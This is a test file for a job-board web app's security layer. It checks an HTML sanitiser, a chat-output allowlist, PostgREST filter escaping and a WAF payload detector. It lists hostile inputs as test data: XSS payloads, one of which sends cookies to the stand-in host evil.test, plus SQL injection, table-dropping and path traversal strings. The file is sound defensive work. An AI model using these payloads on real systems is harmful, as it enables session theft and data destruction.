import { describe, it, expect } from 'vitest';
import { containsSuspiciousPayload, sanitizePostgrestFilter } from '@/lib/security';
import { sanitizeRichText, sanitizeInlineMarkup } from '@/lib/sanitize-html';

/**
 * Stored-XSS regression tests.
 *
 * Job and company descriptions are rendered with dangerouslySetInnerHTML in
 * src/app/jobs/[id]/job-details-client.tsx after being passed through
 * DOMPurify. These assert that the sanitiser actually neutralises the payloads
 * a recruiter could put into a job description.
 */
describe('HTML sanitisation of recruiter-supplied descriptions', () => {
  const payloads = [
    '<script>alert(document.cookie)</script>',
    '<img src=x onerror="fetch(`https://evil.test/?c=`+document.cookie)">',
    '<svg/onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<a href="javascript:alert(1)">click</a>',
    '<body onload=alert(1)>',
    '<div style="background:url(javascript:alert(1))">x</div>',
    '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>',
    '<math><mtext><style><img src=x onerror=alert(1)>',
  ];

  for (const payload of payloads) {
    it(`neutralises: ${payload.slice(0, 45)}`, () => {
      const clean = sanitizeRichText(payload);
      expect(clean.toLowerCase()).not.toContain('<script');
      expect(clean.toLowerCase()).not.toContain('onerror=');
      expect(clean.toLowerCase()).not.toContain('onload=');
      expect(clean.toLowerCase()).not.toContain('javascript:');
      expect(clean.toLowerCase()).not.toContain('<iframe');
      expect(clean.toLowerCase()).not.toContain('<object');
      // Inline CSS is dropped too: it enables silent exfiltration via url().
      expect(clean.toLowerCase()).not.toContain('style=');
    });
  }

  it('preserves the legitimate formatting a job description needs', () => {
    const html = '<p>We need a <strong>Senior Engineer</strong>.</p><ul><li>Node.js</li></ul>';
    const clean = sanitizeRichText(html);
    expect(clean).toContain('<strong>');
    expect(clean).toContain('<li>');
    expect(clean).toContain('Senior Engineer');
  });
});

/**
 * The chat assistant renders model output through a narrow allowlist.
 */
describe('Assistant markdown rendering allowlist', () => {
  it('drops everything outside the allowlist', () => {
    const clean = sanitizeInlineMarkup('<strong>ok</strong><img src=x onerror=alert(1)><script>x</script>');
    expect(clean).toContain('<strong>ok</strong>');
    expect(clean.toLowerCase()).not.toContain('<img');
    expect(clean.toLowerCase()).not.toContain('<script');
  });
});

/**
 * PostgREST filter strings are built by string concatenation in the search
 * paths, so the sanitiser must strip the operator characters that would let a
 * caller escape the intended filter.
 */
describe('PostgREST filter sanitisation', () => {
  it('strips operator and grouping characters', () => {
    const dirty = 'admin,or(role.eq.Admin),name.ilike."%"';
    const clean = sanitizePostgrestFilter(dirty);
    for (const ch of [',', '(', ')', '.', ':', '"', "'", '%', '\\', ';']) {
      expect(clean).not.toContain(ch);
    }
  });

  it('handles empty and non-string input', () => {
    expect(sanitizePostgrestFilter(null)).toBe('');
    expect(sanitizePostgrestFilter(undefined)).toBe('');
    expect(sanitizePostgrestFilter('')).toBe('');
  });

  it('leaves ordinary search terms usable', () => {
    expect(sanitizePostgrestFilter('senior backend engineer')).toBe('senior backend engineer');
  });
});

describe('WAF payload detection', () => {
  const hostile = [
    "1' OR '1'='1",
    '1 UNION SELECT username FROM users',
    'DROP TABLE jobs',
    'SELECT * FROM information_schema.tables',
    '<script>alert(1)</script>',
    'javascript:alert(1)',
    '<img src=x onerror=alert(1)>',
    '../../../../etc/passwd',
    '..\\..\\windows\\win.ini',
  ];

  for (const p of hostile) {
    it(`flags: ${p.slice(0, 40)}`, () => {
      expect(containsSuspiciousPayload(p)).toBe(true);
    });
  }

  const benign = [
    '/api/jobs?search=senior+engineer',
    '/api/jobs?location=Bengaluru&page=2',
    'Full-time Backend Developer (Node.js)',
  ];

  for (const p of benign) {
    it(`allows: ${p.slice(0, 40)}`, () => {
      expect(containsSuspiciousPayload(p)).toBe(false);
    });
  }
});
